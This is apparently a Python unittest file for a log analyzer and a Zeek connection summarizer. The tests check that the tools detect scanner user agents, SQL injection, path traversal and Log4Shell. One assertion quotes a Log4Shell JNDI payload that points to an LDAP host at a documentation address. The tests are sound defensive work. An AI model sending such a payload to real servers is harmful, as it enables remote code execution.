"""Regression tests for the two Python tools in practical-evidence/.

The tools are plain scripts, so the tests run them the way a user would and assert on the output.
Standard library only: `python -m unittest discover -s tests -v`.
"""

import re
import subprocess
import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
ANALYZER = ROOT / "practical-evidence" / "python-log-analyzer" / "analyze.py"
ACCESS_LOG = ROOT / "practical-evidence" / "python-log-analyzer" / "sample_access.log"
ZEEK_TOOL = ROOT / "practical-evidence" / "zeek-conn-summary" / "zeek_conn_summary.py"
CONN_LOG = ROOT / "practical-evidence" / "zeek-conn-summary" / "sample_conn.log"


def run(script: Path, sample: Path, *extra: str) -> str:
    result = subprocess.run(
        [sys.executable, str(script), str(sample), *extra],
        capture_output=True,
        text=True,
        timeout=60,
    )
    if result.returncode != 0:
        raise AssertionError(f"{script.name} failed:\n{result.stderr}")
    # Normalise line endings so the assertions behave the same on Windows and Linux runners.
    return result.stdout.replace("\r\n", "\n").replace("\r", "\n")


class TestLogAnalyzer(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.out = run(ANALYZER, ACCESS_LOG)

    def test_counts_requests(self):
        self.assertIn("Requests  : 26", self.out)
        self.assertIn("Unique IP : 9", self.out)

    def test_detects_scanner_user_agents(self):
        for needle in ("nikto", "sqlmap", "python-requests", "curl/"):
            pattern = re.compile(rf"^\s+\d+\s+\S+\s+{re.escape(needle)}$", re.MULTILINE)
            self.assertIsNotNone(pattern.search(self.out), msg=f"missing scanner row: {needle}")

    def test_detects_sql_injection_after_url_decoding(self):
        # The sample carries three percent-encoded SQLi payloads; the first version of the
        # tool found only one because it matched against the raw path.
        self.assertRegex(self.out, r"3\s+sql-injection\s+203\.0\.113\.61")

    def test_detects_path_traversal(self):
        self.assertRegex(self.out, r"3\s+path-traversal\s+203\.0\.113\.77")

    def test_detects_log4shell_from_user_agent(self):
        # The payload sits in the User-Agent field, not the path. This is the regression that
        # the header-scanning change exists for.
        self.assertRegex(self.out, r"1\s+log4shell\s+192\.0\.2\.150")
        self.assertIn("${jndi:ldap://192.0.2.150:1389/a}", self.out)

    def test_status_summary_present(self):
        self.assertIn("4xx/5xx responses : 7 (27%)", self.out)

    def test_top_option_limits_rows(self):
        out = run(ANALYZER, ACCESS_LOG, "--top", "2")
        ips = re.findall(r"^\s+\d+\s+#+\s+(\d+\.\d+\.\d+\.\d+)$", out, re.M)
        self.assertLessEqual(len(ips), 4)  # two tables list IPs (sources, then nothing else)


class TestZeekSummary(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.out = run(ZEEK_TOOL, CONN_LOG)

    def test_reads_connection_count(self):
        self.assertIn("10 connections", self.out)

    def test_reports_states_and_talkers(self):
        self.assertIn("SF=8", self.out)
        self.assertIn("10.10.5.21", self.out)

    def test_json_mode_is_valid(self):
        out = run(ZEEK_TOOL, CONN_LOG, "--json")
        import json

        data = json.loads(out)
        self.assertIsInstance(data, dict)

    def test_sample_uses_documentation_ranges_only(self):
        text = CONN_LOG.read_text(encoding="utf-8")
        for ip in re.findall(r"\b(\d{1,3}(?:\.\d{1,3}){3})\b", text):
            self.assertTrue(
                ip.startswith(("10.", "192.0.2.", "198.51.100.", "203.0.113.")),
                f"sample_conn.log contains a non-documentation address: {ip}",
            )


class TestSampleDataHygiene(unittest.TestCase):
    """Guards the SECURITY-CHECK claim that every sample address is safe to publish."""

    def test_access_log_addresses_are_safe(self):
        text = ACCESS_LOG.read_text(encoding="utf-8")
        for ip in re.findall(r"\b(\d{1,3}(?:\.\d{1,3}){3})\b", text):
            self.assertTrue(
                ip.startswith(("10.", "192.0.2.", "198.51.100.", "203.0.113.")),
                f"sample_access.log contains a non-documentation address: {ip}",
            )


if __name__ == "__main__":
    unittest.main()
